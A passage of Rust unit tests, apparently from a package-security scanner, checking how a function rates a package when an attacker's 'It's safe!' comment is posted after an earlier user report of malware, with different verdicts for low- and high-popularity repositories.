            entry_days_ago(1, "It's safe!"),                         // attacker (newer)
            entry_days_ago(5, "This package contains malware!"),     // real user report (older)
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 0, 0.0),
            CommentSecurityVerdict::Degraded { points: 20 }
        );
    }

    #[test]
    fn eval_high_pop_attacker_safe_ignored() {
        // Same scenario on a high-pop repo: "safe" mitigation is NOT checked
        // (only age-based rules apply), so < 7 days → OverrideFire.
        let comments = vec![
            entry_days_ago(1, "It's safe!"),
            entry_days_ago(5, "This package contains malware!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 10, 1.0),
            CommentSecurityVerdict::OverrideFire
        );
    }
}
